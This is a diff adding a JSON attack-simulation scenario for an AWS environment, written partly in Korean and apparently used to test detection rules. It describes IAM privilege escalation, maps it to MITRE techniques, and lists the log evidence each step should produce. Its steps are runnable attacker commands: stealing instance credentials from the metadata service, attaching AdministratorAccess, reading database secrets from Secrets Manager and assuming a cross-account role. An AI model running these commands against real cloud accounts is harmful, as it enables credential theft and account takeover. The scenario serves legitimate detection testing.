@@ -1,0 +1,64 @@
+{
+  "scenario_id": "S5",
+  "name": "iam_privilege_escalation",
+  "description": "IAM 역할 남용 + 권한 상승 시도 (클라우드 레이어)",
+  "category": "privilege_escalation",
+  "severity": "critical",
+  "mitre_tactics": ["TA0004-Privilege Escalation", "TA0003-Persistence", "TA0005-Defense Evasion"],
+  "mitre_techniques": ["T1078.004-Valid Accounts: Cloud Accounts", "T1098-Account Manipulation", "T1552.005-Unsecured Credentials: Cloud Instance Metadata API"],
+  "prerequisites": ["S4 웹셸 활성 또는 EC2 인스턴스 접근", "IMDSv2 우회 시나리오"],
+  "actor": "공격자 (인스턴스 내부에서)",
+  "steps": [
+    {
+      "step": 1,
+      "action": "IMDS 토큰 획득 시도 (IMDSv2)",
+      "command": "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "expected": "인스턴스 역할 임시 자격증명 획득"
+    },
+    {
+      "step": 2,
+      "action": "획득 자격증명으로 API 호출",
+      "command": "aws sts get-caller-identity && aws s3 ls && aws iam list-roles",
+      "expected": "S3 접근 가능, IAM list 권한 없음 (최소 권한)"
+    },
+    {
+      "step": 3,
+      "action": "권한 상승 시도 (정책 첨부)",
+      "command": "aws iam attach-role-policy --role-name EA-APP-Role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+      "expected": "AccessDenied → CloudTrail 기록"
+    },
+    {
+      "step": 4,
+      "action": "Secrets Manager 접근 시도",
+      "command": "aws secretsmanager get-secret-value --secret-id ea-wordpress-db-credentials",
+      "expected": "APP 역할은 접근 가능 → DB 자격증명 유출 가능"
+    },
+    {
+      "step": 5,
+      "action": "Security 계정 역할 AssumeRole 시도",
+      "command": "aws sts assume-role --role-arn arn:aws:iam::SECURITY_ACCOUNT:role/EA-CollectionTarget --role-session-name attacker",
+      "expected": "AccessDenied (Condition 태그 불일치)"
+    }
+  ],
+  "expected_evidence": {
+    "waf": [],
+    "suricata": [],
+    "nginx": [],
+    "apache": [],
+    "wordpress_audit": [],
+    "elastic_defend": ["aws CLI 프로세스 실행 (www-data 또는 비정상 사용자)"],
+    "auditd": ["execve: aws, curl (169.254.169.254)"],
+    "flow_logs": ["인스턴스→IMDS 169.254.169.254 트래픽"],
+    "cloudtrail": [
+      "GetCallerIdentity",
+      "ListBuckets", "ListRoles (AccessDenied)",
+      "AttachRolePolicy (AccessDenied)",
+      "GetSecretValue",
+      "AssumeRole (AccessDenied)",
+      "전부 sourceIPAddress가 인스턴스 IP"
+    ],
+    "rds": []
+  },
+  "detection_rules": ["cloudtrail-unauthorized-api", "cloudtrail-iam-policy-change-attempt", "cloudtrail-secrets-access", "elastic-aws-cli-from-webserver", "auditd-imds-access"],
+  "success_criteria": "CloudTrail에서 비인가 API 호출 탐지 → alert → 증거 수집 + IAM 대응 플레이북 트리거"
+}
